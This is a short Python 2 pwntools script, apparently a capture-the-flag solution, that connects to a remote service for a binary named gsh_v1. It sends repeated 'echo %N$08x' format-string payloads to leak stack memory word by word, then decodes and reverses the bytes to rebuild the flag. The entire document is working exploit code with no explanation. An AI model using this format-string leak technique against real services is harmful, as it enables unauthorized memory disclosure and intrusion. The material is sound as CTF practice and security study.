from pwn import *

#r = process('./gsh_v1')
r = remote('106.10.34.139', 20004)

r.sendlineafter('$ ', 'flag')

flag = ''
cnt = 19
while True:
    r.sendlineafter('$ ', 'echo %{}$08xend'.format(cnt))
    s = r.recvuntil('end', drop=True)
    print s
    if s == '00000000':
        break
    flag += s.decode('hex')[::-1]
    cnt += 1

print flag

